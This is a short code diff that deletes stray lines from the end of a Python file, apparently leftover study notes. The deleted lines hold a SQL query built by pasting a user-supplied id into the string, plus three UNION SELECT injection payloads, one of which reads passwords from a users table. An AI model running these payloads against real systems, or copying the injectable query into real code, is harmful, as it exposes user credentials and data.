@@ -41,12 +41,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
-
-    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
-
-a' UNION SELECT "text1","text2";-- -
-
-
-a' UNION SELECT first_name, last_name FROM users LIMIT 1;-- -
-a' UNION SELECT first_name, password as last_name FROM users LIMIT 1;-- -
